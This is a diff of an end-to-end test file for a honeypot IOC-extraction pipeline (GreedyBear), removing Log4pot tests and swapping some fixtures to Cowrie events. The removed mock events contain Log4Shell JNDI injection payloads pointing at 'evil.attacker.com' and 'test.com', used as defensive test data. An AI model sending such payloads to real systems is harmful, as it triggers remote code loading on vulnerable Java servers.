@@ -88,73 +88,6 @@ class TestCowrieE2E(E2ETestCase):
         self.assertGreaterEqual(result, 0)
 
 
-class TestLog4potE2E(E2ETestCase):
-    """E2E tests for Log4pot extraction through the real pipeline."""
-
-    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
-    def test_log4pot_extracts_exploit_ioc(self, mock_scores):
-        """
-        E2E: Log4pot exploit event → real Log4potExtractionStrategy → IOC.
-        """
-        pipeline = self._create_pipeline_with_real_factory()
-
-        log4pot_hits = [
-            MockElasticHit(
-                {
-                    "src_ip": "198.51.100.10",
-                    "type": "Log4pot",
-                    "reason": "exploit",
-                    "correlation_id": "corr123",
-                    "deobfuscated_payload": "${jndi:ldap://evil.attacker.com:1389/a}",
-                    "timestamp": "2025-01-01T08:00:00",
-                    "dest_port": 8080,
-                }
-            ),
-        ]
-        pipeline.elastic_repo.search.return_value = [log4pot_hits]
-        pipeline.ioc_repo.is_empty.return_value = False
-        pipeline.ioc_repo.is_ready_for_extraction.return_value = True
-        pipeline.ioc_repo.get_ioc_by_name.return_value = None
-
-        mock_ioc = self._create_mock_ioc("198.51.100.10")
-        with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
-            mock_add.return_value = mock_ioc
-            result = pipeline.execute()
-
-        self.assertGreaterEqual(result, 0)
-
-    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
-    def test_log4pot_non_exploit_skipped(self, mock_scores):
-        """
-        E2E: Log4pot request (non-exploit) → should not extract payload IOC.
-        """
-        pipeline = self._create_pipeline_with_real_factory()
-
-        log4pot_hits = [
-            MockElasticHit(
-                {
-                    "src_ip": "10.0.0.50",
-                    "type": "Log4pot",
-                    "reason": "request",  # Not an exploit
-                    "correlation_id": "req123",
-                    "timestamp": "2025-01-01T10:00:00",
-                }
-            ),
-        ]
-        pipeline.elastic_repo.search.return_value = [log4pot_hits]
-        pipeline.ioc_repo.is_empty.return_value = False
-        pipeline.ioc_repo.is_ready_for_extraction.return_value = True
-        pipeline.ioc_repo.get_ioc_by_name.return_value = None
-
-        mock_ioc = self._create_mock_ioc("10.0.0.50")
-        with patch("greedybear.cronjobs.extraction.ioc_processor.IocProcessor.add_ioc") as mock_add:
-            mock_add.return_value = mock_ioc
-            result = pipeline.execute()
-
-        # Should still process scanner IOC but not payload
-        self.assertGreaterEqual(result, 0)
-
-
 class TestGenericE2E(E2ETestCase):
     """E2E tests for generic/unknown honeypot extraction."""
 
@@ -198,7 +131,7 @@ class TestMixedHoneypotE2E(E2ETestCase):
     @patch("greedybear.cronjobs.repositories.CowrieSessionRepository")
     def test_mixed_honeypots_use_correct_strategies(self, mock_session_repo, mock_scores):
         """
-        E2E: Mixed Cowrie + Log4pot + Generic → correct strategy for each.
+        E2E: Mixed Cowrie + Dionaea → correct strategy for each.
         """
         pipeline = self._create_pipeline_with_real_factory()
 
@@ -211,16 +144,6 @@ class TestMixedHoneypotE2E(E2ETestCase):
                     "eventid": "cowrie.session.connect",
                     "timestamp": "2025-01-01T10:00:00",
                     "dest_port": 22,
-                }
-            ),
-            MockElasticHit(
-                {
-                    "src_ip": "10.2.2.2",
-                    "type": "Log4pot",
-                    "reason": "exploit",
-                    "correlation_id": "log4_corr",
-                    "deobfuscated_payload": "${jndi:ldap://test.com:1389/a}",
-                    "timestamp": "2025-01-01T10:00:01",
                 }
             ),
             MockElasticHit(
@@ -413,8 +336,9 @@ class TestIocContentVerification(E2ETestCase):
             MockElasticHit(
                 {
                     "src_ip": "10.0.0.3",
-                    "type": "Log4pot",
-                    "path": "/api",
+                    "type": "Cowrie",
+                    "session": "sess3",
+                    "eventid": "cowrie.session.connect",
                     "@timestamp": "2025-01-15T12:00:00",
                 }
             ),
